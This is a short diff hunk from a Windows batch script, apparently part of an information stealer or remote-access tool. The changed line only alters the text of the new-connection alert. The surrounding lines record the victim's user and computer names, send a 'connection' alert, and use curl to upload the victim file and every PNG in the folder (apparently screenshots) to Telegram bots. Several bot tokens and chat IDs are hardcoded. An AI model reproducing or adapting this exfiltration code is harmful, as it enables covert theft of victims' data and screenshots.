@@ -102,7 +102,7 @@ if "%FMSG%"=="" (
 )
 echo %FMSG% >> "%userN%@%computerN%.txt"
 
-"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %FMSG% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 
+"%environment%\curl.exe" -k %proxy% -F text="A \U0001F608 CONNECTION: %FMSG% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
 "%environment%\curl.exe" -k %proxy% -F document=@"%userN%@%computerN%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652
 
